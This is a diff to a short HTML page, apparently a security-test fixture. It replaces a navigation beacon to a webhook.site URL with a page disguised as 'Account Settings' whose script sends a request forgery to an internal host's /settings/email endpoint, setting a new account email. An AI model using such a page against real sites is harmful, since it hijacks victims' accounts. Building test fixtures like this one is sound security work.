@@ -1,16 +1,18 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Navigation Test</title>
-</head>
-<body>
-    <p>Testing navigation...</p>
+  <head>
+    <meta charset="UTF-8" />
+    <title>Account Settings</title>
+  </head>
+  <body>
+    <p>Loading...</p>
 
     <script>
-        location.assign(
-            "https://webhook.site/c56d84de-0309-408c-bcc5-b150703ec3c8?test=top-level-navigation"
-        );
+      const target = new URL("http://100.101.228.35:6009/settings/email");
+
+      target.searchParams.set("new", "tpas-csrf@example.org");
+
+      location.assign(target.href);
     </script>
-</body>
+  </body>
 </html>
